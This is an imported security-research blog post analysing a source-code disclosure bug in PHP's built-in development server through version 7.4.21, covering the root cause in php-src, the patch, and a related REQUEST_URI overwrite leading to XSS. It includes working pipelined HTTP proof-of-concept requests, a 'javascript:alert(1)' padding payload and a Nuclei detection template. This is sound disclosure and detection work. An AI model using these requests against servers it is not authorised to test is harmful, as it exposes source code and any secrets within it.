---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-28_php-development-server-7421-remote-source-disclosure.md
original_filename: 2023-01-28_php-development-server-7421-remote-source-disclosure.md
title: PHP Development Server <= 7.4.21 - Remote Source Disclosure
category: documents
detected_topics:
- xss
- information-disclosure
- supply-chain
- command-injection
- mfa
- automation-abuse
tags:
- imported
- documents
- xss
- information-disclosure
- supply-chain
- command-injection
- mfa
- automation-abuse
language: en
raw_sha256: ef32187a7de3d82f4a81485a88ffadc900c9981963b0729d783e01478eacc3a9
text_sha256: b0d1cc1a5a1ba2eb806a282f4dcf1dd75a388eacd623b5fe905a5d638bc5fdd7
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# PHP Development Server <= 7.4.21 - Remote Source Disclosure

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-28_php-development-server-7421-remote-source-disclosure.md
- Source Type: markdown
- Detected Topics: xss, information-disclosure, supply-chain, command-injection, mfa, automation-abuse
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `ef32187a7de3d82f4a81485a88ffadc900c9981963b0729d783e01478eacc3a9`
- Text SHA256: `b0d1cc1a5a1ba2eb806a282f4dcf1dd75a388eacd623b5fe905a5d638bc5fdd7`


## Content

---
title: "PHP Development Server <= 7.4.21 - Remote Source Disclosure"
page_title: "PHP Development Server <= 7.4.21 -  Remote Source Disclosure — ProjectDiscovery Blog"
url: "https://blog.projectdiscovery.io/php-http-server-source-disclosure/"
final_url: "https://projectdiscovery.io/blog/php-http-server-source-disclosure"
authors: ["Rahul Maini (@iamnoooob)", "Harsh Jaiswal (@rootxharsh)"]
programs: ["PHP"]
bugs: ["Source code disclosure", "Information disclosure", "Security code review"]
publication_date: "2023-01-28"
added_date: "2023-01-31"
source: "pentester.land/writeups.json"
original_index: 1618
---

![](/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FBlog%20Header%20Background%20Image.07fydz4trtf5v.png&w=3840&q=75)

[Vulnerability Research](/blog/category/vulnerability-research/1)•

[Nuclei & Templates](/blog/category/nuclei-templates/1)

# PHP Development Server <= 7.4.21 - Remote Source Disclosure

By Harsh Jaiswal & Rahul Maini

January 28, 2023

11 min read

![PHP Development Server <= 7.4.21 -  Remote Source Disclosure](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2024%2F01%2FBlog---PHP.png&w=828&q=75)

#### Table of Contents

  * Introduction
  * Root Cause Analysis
  * What went wrong?
  * Patch
  * Bonus
  * Proof of Concept
  * Demo
  * Conclusion

#### Authors

[![Harsh Jaiswal](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F08%2F1585309233118.jpeg&w=96&q=75)Harsh Jaiswal](/blog/author/harsh/1)[![Rahul Maini](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F11%2FTKTMQH41W-U04DH0WJJLX-eec5b4b57170-512.jpeg&w=96&q=75)Rahul Maini](/blog/author/rahul/1)

#### Share

[](https://x.com/intent/post?url=)[](https://www.linkedin.com/shareArticle?mini=true&url=)

## Introduction

While testing request pipelining on multiple programming language built-in servers, we observed strange behavior with PHP’s. As we delved deeper, we discovered a security bug in PHP that could expose the source code of PHP files as if they were static files rather than executing them as intended.

Upon further testing, we found that the vulnerability was **not** present in the latest PHP release. We conducted further tests on different versions of PHP to determine when the bug was fixed, and why. Our investigation led us to the patched version of PHP 7.4.22, and a comparison of the unpatched versus patched code allowed us to see the specific changes made to fix the vulnerability.

It’s important to note that while this issue has been resolved in the PHP source code, Shodan queries reveal many exposed instances of the built-in server. Join us as we detail our findings and share what we learned through our analysis.

![](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F01%2FUntitled.png&w=3840&q=75)

## Root Cause Analysis

This is the unpatched and patched version git diff - <https://github.com/php/php-src/compare/PHP-7.4.21...php-7.4.22>

To fully understand the bug and how it was fixed, we compiled both the patched and unpatched versions of PHP with debugging symbols enabled. Using a proof-of-concept (PoC) request, we triggered the source code disclosure bug and observed the code flow in the debugger.

**PoC Request:**

http

Copy
  
  
  1GET /phpinfo.php HTTP/1.1 
  2Host: pd.research
  3\r\n
  4\r\n
  5GET / HTTP/1.1
  6\r\n
  7\r\n

All the HTTP requests to the CLI server are handled by `php_cli_server_client_read_request`. The trace looks like this:

c

Copy
  
  
  1main(...)
  2	do_cli_server(...) 
  3		php_cli_server_do_event_loop(...)
  4  php_cli_server_do_event_for_each_fd(...)
  5  php_cli_server_poller_iter_on_active(...)
  6  php_cli_server_do_event_for_each_fd_callback(...)
  7  php_cli_server_recv_event_read_request(...)
  8  php_cli_server_client_read_request(...)

The `php_cli_server_client_read_request` function calls the `php_http_parser_execute` function and, as its name suggests, is used to parse HTTP requests. The return value of the function is the number of bytes that were successfully parsed. This value is used to determine how much of the request has been processed and how much remains to be parsed.

When the first part of the request mentioned below is almost finished being parsed:

http

Copy
  
  
  1GET /phpinfo.php HTTP/1.1
  2Host: pd.research
  3\r\n
  4\r\n

and the HTTP request doesn't contain the `Content-Length` header, the `CALLBACK2(message_complete)` in the code below called. Here, `CALLBACK2` is a macro that in turn calls a callback function `php_cli_server_client_read_request_on_message_complete` upon completion of processing of the request message.

c

Copy
  
  
  1if (parser->type == PHP_HTTP_REQUEST || php_http_should_keep_alive(parser)) {
  2/* Assume content-length 0 - read the next */
  3		CALLBACK2(message_complete); // Here
  4		state = NEW_MESSAGE(); // Afterwards the state is reverted back to start_state
  5}

**How does CALLBACK2(…) work?**

The CALLBACK2 Macro is defined here: [https://github.com/php/php-src/blob/PHP-7.4.21/sapi/cli/php_http_parser.c#L31-L37:](https://github.com/php/php-src/blob/PHP-7.4.21/sapi/cli/php_http_parser.c)

c

Copy
  
  
  1#define CALLBACK2(FOR)  \\ 
  2do {  \\
  3  if (settings->on_##FOR) {  \\
  4  if (0 != settings->on_##FOR(parser)) return (p - data);  \\  
  5  }  \\
  6}  \\
  7while (0)

After preprocessing, **CALLBACK2(message_complete)** converts to:

c

Copy
  
  
  1do { 
  2if (settings->on_message_complete) {  
  3 if (0 != **settings->on_message_complete**(parser)) return (p - data);
  4} 
  5} while (0)

**settings** is a struct of type `php_http_parser_settings` whose member fields (function pointers) are declared here:

[https://github.com/php/php-src/blob/e7a0a2b8a2684d2eeb1b8a27123dfe6799817767/sapi/cli/php_http_parser.h#L210-L221](https://github.com/php/php-src/blob/e7a0a2b8a2684d2eeb1b8a27123dfe6799817767/sapi/cli/php_http_parser.h)

Each member of the settings variable is populated with respective callback functions.

[https://github.com/php/php-src/blob/PHP-7.4.21/sapi/cli/php_cli_server.c#L1803-L1813](https://github.com/php/php-src/blob/PHP-7.4.21/sapi/cli/php_cli_server.c)

This reference to **settings** is then passed to `php_http_parser_execute` function as an argument.

c

Copy
  
  
  1nbytes_consumed = php_http_parser_execute(&client->parser, &settings, buf, nbytes_read);

[https://github.com/php/php-src/blob/PHP-7.4.21/sapi/cli/php_cli_server.c#L1840](https://github.com/php/php-src/blob/PHP-7.4.21/sapi/cli/php_cli_server.c)

Similarly, there are `CALLBACK` and `CALLBACK_NOCLEAR` macros that work almost in the same way.

Therefore,`CALLBACK2(message_complete)`results in calling `php_cli_server_client_read_request_on_message_complete(...)` and `CALLBACK(path)` calls `php_cli_server_client_read_request_on_path(...)` and so on.

c

Copy
  
  
  1static int php_cli_server_client_read_request_on_message_complete(php_http_parser *parser)
  2{
  3	...
  4	php_cli_server_request_translate_vpath(&client->request, client->server->document_root, client->server->document_root_len);
  5	...
  6}

Soon, we enter the `php_cli_server_request_translate_vpath` function. This function converts the requested PHP file's path to the full path on the file system. If the requested file is a directory, it checks for the presence of index files such as `index.php` or `index.html` within the directory and uses the path to one of those files if found. This allows the server to serve the correct file in response to a request

In short, this function sets `vpath` and `path_translated` members to the `request` struct. So, for the currently parsed request,

http

Copy
  
  
  1GET /phpinfo.php HTTP/1.1
  2Host: pd.research
  3\r\n
  4\r\n

we end up inside this conditional branch where the `**request->path_translated**` is set. This is important and will be used later.

jsx

Copy
  
  
  1static void php_cli_server_request_translate_vpath(php_cli_server_request *request, const char *document_root, size_t document_root_len) {  
  2...  
  3  else {
  4  
  5  pefree(request->vpath, 1);
  6  request->vpath = pestrndup(vpath, q - vpath, 1);
  7  request->vpath_len = q - vpath;
  8  // At this time buf is equal to /tmp/php/phpinfo.php where /tmp/php/ 
  9  // is whatever the server's working directory is. 
  10  request->path_translated = buf;  
  11  // so the request->path_translated is now /tmp/php/phpinfo.php  
  12  request->path_translated_len = q - buf;
  13  ...
  14  }  
  15...
  16
  17}

After the function call stack unwinds, we continue our execution of the flow inside `php_http_parser_execute`. Now, the 2nd part of the request is parsed as the state is reverted to `start_state`:

http

Copy
  
  
  1GET / HTTP/1.1
  2\r\n
  3\r\n

Just as with the initial request, we enter the `php_cli_server_client_read_request_on_message_complete` function and then call `php_cli_server_request_translate_vpath`. This process is used to parse and process the subsequent request in the same way as the first request.

This time, inside `php_cli_server_request_translate_vpath`, since we are requesting a directory (`/`) instead of a file, we will enter a different block of code.

c

Copy
  
  
  1...
  2// loops and checks for index.php, index.html inside working dir
  3while (*file) { 
  4	size_t l = strlen(*file);
  5	memmove(q, *file, l + 1);
  6	if (!php_sys_stat(buf, &sb) && (sb.st_mode & S_IFREG)) {
  7		q += l
  8		break;
  9	}
  10	file++;
  11}
  12
  13	if (!*file || is_static_file) {
  14	// In case, index files are not present we enter here
  15
  16		if (prev_path) {
  17		pefree(prev_path, 1);
  18		}
  19
  20		pefree(buf, 1);
  21		return; // This time we return from the function 
  22  // and no request->vpath or request->path_translated
  23  // is set.
  24	}
  25...

Finally, after the request's parsing is completed, and we return from `php_http_parser_execute`. The return values of length of bytes parsed (`nbytes_consumed`) and length of bytes read (`nbytes_read`) are compared (more on this here). If they are equal, the code flow continues and we enter the `php_cli_server_dispatch` function.

c

Copy
  
  
  1static  int  php_cli_server_dispatch(php_cli_server *server, php_cli_server_client *client) {
  2...
  3	if (client->request.ext_len != 3
  4	|| (ext[0] != 'p' && ext[0] != 'P') || (ext[1] != 'h' && ext[1] != 'H') || (ext[2] != 'p' && ext[2] != 'P')
  5	|| !client->request.path_translated) {
  6
  7	is_static_file = 1;
  8	}
  9...
  10}

The code provided above includes a check to determine whether a requested file should be treated as a static file or executed as a PHP file. This is done by examining the extension of the file. If the extension is not `.php` or `.PHP`, or if the length of the extension is not equal to 3, the file is considered to be a static file. This is indicated by setting the `is_static_file` variable to 1.

The code also checks that the `path_translated` field of the `client->request` object is not null. This field contains the full path to the requested file on the file system, and is used to locate and serve the file. If the `path_translated` field is null, it indicates that the requested file could not be found, and the request will be treated as an error.

The code flow proceeds to the `php_cli_server_begin_send_static` function because `is_static_file` is set to true.

c

Copy
  
  
  1if (!is_static_file) {
  2  ... // Executes the file as PHP script
  3} else {
  4  ...
  5  if (SUCCESS != php_cli_server_begin_send_static(server, client)) {
  6  php_cli_server_close_connection(server, client);
  7	 }
  8	...
  9}

## What went wrong?

Here lies the bug. As seen in the aforementioned code blocks, after parsing of the second request the `vpath` is set to `/` and assuming no index files were found the `client->request.ext` will be set to `NULL`. However, the `client->request.path_translated` is still set to `/tmp/php/phpinfo.php` from the first request. The checks are performed on the `client->request.ext` of second request and we enter this branch and which sets `is_static_file` to `1`. Basically, saying treat the requested file as a static file and not a PHP script.

c

Copy
  
  
  1static int php_cli_server_begin_send_static(php_cli_server *server, php_cli_server_client *client) { 
  2	#ifdef PHP_WIN32
  3	...
  4	#else
  5	fd = client->request.path_translated ? open(client->request.path_translated, O_RDONLY): -1;
  6	#endif...
  7	client->file_fd = fd;
  8	...
  9}

Notice that this function opens and retrieves a file descriptor to the file path stored in `client->request.path_translated`. In our example, `client->request.path_translated` would be set to `/tmp/php/phpinfo.php`. This discrepancy, where the checks happen on the `client->request.ext` of the second request but afterward the file is opened on `client->request.path_translated` which was set by the first request, leads to source code disclosure.

Now as the file is marked as `is_static_file`, the code flow now simply reads the fd and returns it as static file rather than executing it.

## **Patch**

A check was introduced in PHP 7.4.22. This fix checks if the `vpath` member of the `request` struct is not NULL when parsing the request path. If it is not NULL, the function returns 1.

c

Copy
  
  
  1static int php_cli_server_client_read_request_on_path(php_http_parser *parser, const char *at, size_t length)
  2{
  3	...
  4  if (UNEXPECTED(client->request.vpath != NULL)) {
  5  return 1;
  6		}
  7	...
  8	}
  9	return 0;
  10}

When the path of the first part of request message is parsed, the `client->request.vpath` is initially NULL and later on set to `/phpinfo.php`. However, when the path of second part of the request is parsed, the `client->request.vpath` is already set and not NULL which causes the function to return 1.

c

Copy
  
  
  1#define CALLBACK(FOR)  \\
  2do {  \\
  3  CALLBACK_NOCLEAR(FOR);  \\
  4  FOR##_mark = NULL;  \\
  5} while (0)
  6
  7#define CALLBACK_NOCLEAR(FOR)  \\
  8do {  \\
  9  if (FOR##_mark) {  \\
  10  if (settings->on_##FOR) {  \\
  11  if (0 != settings->on_##FOR(parser,  \\
  12  FOR##_mark,  \\
  13  p - FOR##_mark))  \\
  14  {  \\
  15  return (p - data);  \\
  16  }  \\
  17  }  \\
  18  }  \\
  19} while (0)

While parsing the path of the second request we enter into this patched function `php_cli_server_client_read_request_on_path` from `CALLBACK(path)` [here](https://github.com/php/php-src/blob/PHP-7.4.21/sapi/cli/php_http_parser.c). The `CALLBACK(path)` macro check ensures that the return value of the callback function is always 0. If that’s not the case, we will return from the parsing function `php_http_parser_execute` and the return value would be the number of bytes it has already consumed while parsing the request.

The return value is stored in `nbytes_consumed` variable and is compared with `nbytes_read` (i.e., the actual number of bytes in the request).

c

Copy
  
  
  1nbytes_consumed = php_http_parser_execute(&client->parser, &settings, buf, nbytes_read);
  2	
  3	if (**nbytes_consumed != (size_t)nbytes_read**) {
  4		if (php_cli_server_log_level >= PHP_CLI_SERVER_LOG_ERROR) {
  5  if (buf[0] & 0x80 /* SSLv2 */ || buf[0] == 0x16 /* SSLv3/TLSv1 */) {
  6  *errstr = estrdup("Unsupported SSL request");
  7  } else {
  8  *errstr = estrdup("Malformed HTTP request");
  9  }
  10		}
  11		return -1;
  12	}

If the number of bytes consumed by the parser is not equal to the total number of bytes read, it means that the request is malformed. In this case, the code checks the first byte of the buffer to determine whether the request is an SSL request. Otherwise, it sets the error message to “**Malformed HTTP request** ” and returns.

## Bonus

A different bug that fortunately also addressed this remote source code disclosure issue in subsequent versions is <https://bugs.php.net/bug.php?id=73630>. During the parsing of an HTTP request, when certain callbacks are called multiple times, the `REQUEST_URI` server variable gets overwritten with a substring of itself.

This behavior can result in open redirects or cross-site scripting (XSS) attacks in some cases. Here’s an example:

**Example Snippet:**

php

Copy
  
  
  1<a href="<?php echo htmlentities($_SERVER['REQUEST_URI']) ?>">Unexpected url</a>

requesting `GET /index.php?abcd` will result in being rendered as:

html

Copy
  
  
  1<a href="/index.php?abcd">Unexpected url</a>

The hyperlink will always be relative to the domain where it is hosted. Also, the path would convert meta-characters to their HTML entities. Therefore, XSS is not feasible.

However, this can still be exploited by an attacker by sending a GET request with a very long query string in the URL, such as the one shown in the example.

jsx

Copy
  
  
  1GET /?[AAAA...<1425 times>]javascript:alert(1) HTTP/1.1
  2Host: pd.research

The `REQUEST_URI` is overwritten and only ends up with `javascript:alert(1)`. The amount of padding required to be successfully overwrite it with desired content varies and may need to be adjusted.

![](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F01%2FUntitled--1-.png&w=3840&q=75)

## Proof of Concept

**Basic POC** :

http

Copy
  
  
  1GET /phpinfo.php HTTP/1.1
  2Host: pd.research
  3\r\n
  4GET / HTTP/1.1
  5\r\n
  6\r\n

The above request provides a basic HTTP request as a proof of concept that will disclose the source code `phpinfo.php` instead of executing it.

💡

Make sure to turn off “****Update Content-Length**** ” in an Intercepting HTTP Proxy such as Burp Suite for the Proof of Concept to work.

We observed that the source code won’t be disclosed if the `index.php` file exists in the current directory where the server is started from. However, we came up with a slight modification of the exploit POC that would disclose the source code regardless of, if the `index.php` file exists or not. The reason for this lies in the above explanation of the bug.

**Upgraded POC:**

http

Copy
  
  
  1GET /index.php HTTP/1.1
  2Host: pd.research
  3\r\n
  4GET /xyz.xyz HTTP/1.1
  5\r\n
  6\r\n

**Nuclei Template:**  
  
To ease the detection in an automated way against a large set of hosts, we have created [nuclei](https://github.com/projectdiscovery/nuclei) template and added it to the public [nuclei-template](https://github.com/projectdiscovery/nuclei-templates) GitHub repository.  
  
Template pull request: <https://github.com/projectdiscovery/nuclei-templates/pull/6633>

yaml

Copy
  
  
  1id: php-src-diclosure
  2
  3info:
  4  name: PHP <= 7.4.21 - Built-in Server Remote Source Disclosure
  5  author: pdteam
  6  severity: medium
  7  metadata:
  8  verified: true
  9  shodan-query: The requested resource <code class="url">
  10  tags: php,phpcli,disclosure
  11
  12requests:
  13  - raw:
  14  - |+
  15  GET /  HTTP/1.1
  16  Host: {{Hostname}}
  17  
  18  GET /{{rand_base(3)}}.{{rand_base(2)}} HTTP/1.1
  19  
  20  
  21
  22  
  23  
  24  - |+
  25  GET /  HTTP/1.1
  26  Host: {{Hostname}}
  27
  28  unsafe: true
  29  matchers:
  30  - type: dsl
  31  dsl:
  32  - 'contains(body_1, "<?php")' 
  33  - '!contains(body_2, "<?php")'
  34  condition: and

## Demo

cli

Copy
  
  
  1cat index.php
  2
  3<a href="<?php echo htmlentities($_SERVER['REQUEST_URI']) ?>">Unexpected url</a>

cli

Copy
  
  
  1cat Dockerfile
  2
  3FROM php:7.4.21-zts-buster
  4COPY index.php /var/www/html/index.php
  5CMD ["php", "-S", "0.0.0.0:8888", "-t", "/var/www/html/"]

cli

Copy
  
  
  1docker build . -t phptest
  2docker run -p 8888:8888 phptest
  3
  4[Sat Jan 28 20:09:07 2023] PHP 7.4.21 Development Server (http://0.0.0.0:8888) started

![](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F01%2Fimage-4.png&w=3840&q=75)

##  
Conclusion

In conclusion, our research aimed to investigate request pipelining on multilayered architecture. As part of our study, we examined the PHP built-in server and stumbled upon a security bug present in an older version of PHP on the test server. This vulnerability could allow the source code of PHP files to be exposed as if they were static files. Our investigation led us to identify that the issue was fixed in the later version of PHP, specifically PHP 7.4.22

It is important to note, even though the PHP team advises not to use the CLI server in production, there are at least a few thousand exposed instances of the built-in server are still present on the Internet. Additionally, it's possible that the PHP CLI server can be behind multiple reverse proxies or load balancers, which would make it more challenging to exploit. In our testing using servers such as NGINX and Apache in conjunction with PHP CLI Server, we were unable to exploit the vulnerability. We welcome feedback from readers on any other configurations or methods that may be used to exploit this vulnerability.  
  
\- [**Rahul** Maini](https://twitter.com/iamnoooob), [**Harsh** Jaiswal](https://twitter.com/rootxharsh) @ ProjectDiscovery Research

[Interested in ProjectDiscovery Cloud Platform? Learn more here...](https://projectdiscovery.io/)

## Related stories

Related stories

[View all](/blog/category/vulnerability-research/1)

[![Nuclei Templates - April 2026](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2026%2F05%2Fapril-month.png&w=828&q=75)](/blog/nuclei-templates-april-2026)

### [Nuclei Templates - April 2026Two releases shipped this cycle - v10.4.2 (April 15) and v10.4.3 (May 5) - delivering deep KEV coverage, a major push into AI/LLM attack surface, fresh Perforce visibility, and broad quality improvements across the template library. 🚀 April Stats Release New Templates CVEs Added First-time Contributors v10.4.2 121 61 15 v10.4.3 105 62 12 Total 226 123 27 * 226 new templates shipped across both releases * 123 CVEs covered, including ~10 actively exploited vulnerabilities ](/blog/nuclei-templates-april-2026)

[![Beyond the Model: Neo Hunts, Exploits, and Proves 22 Zero-Days.](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2026%2F03%2FEveryone-is-finding-vulns.--The-hard-part-is-proving-them.--Blog-Thumbnail-.png&w=828&q=75)](/blog/everyone-is-finding-vulns-the-hard-part-is-proving-them)

### [Beyond the Model: Neo Hunts, Exploits, and Proves 22 Zero-Days.LLMs are a genuine leap forward for vulnerability discovery. Anthropic reported 500+ zero-days from Opus 4.6 and OpenAI's Codex Security discovered 14 CVEs across projects like OpenSSH and GnuTLS. If you've experimented with LLMs for security testing, you've probably been impressed too. The practical reality for a security team deploying AI is messier than the headlines or early POC results suggest. Noise compounds fast. Anthropic brought in external security researchers to help validate the vo](/blog/everyone-is-finding-vulns-the-hard-part-is-proving-them)

[![Inside the benchmark: app architectures, walkthroughs of findings, and what each scanner actually caught](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2026%2F03%2FInside-the-Benchmark--Blog-Thumbnail---Updated-.png&w=828&q=75)](/blog/inside-the-benchmark-pp-architectures-finding-walkthroughs-and-what-each-scanner-actually-caught)

### [Inside the benchmark: app architectures, walkthroughs of findings, and what each scanner actually caughtThis is Part 2 of our vibe coding security benchmark study. In Part 1, we compared how LLM-based security tools like ProjectDiscovery's Neo and Claude Code performed against traditional SAST and DAST scanners on AI-generated code. We found that LLM-based tools like Neo and Claude Code detected many high-value findings that traditional scanners missed. Between Neo and Claude Code, Neo produced more true positives and fewer false positives because it could validate hypotheses against a running app](/blog/inside-the-benchmark-pp-architectures-finding-walkthroughs-and-what-each-scanner-actually-caught)
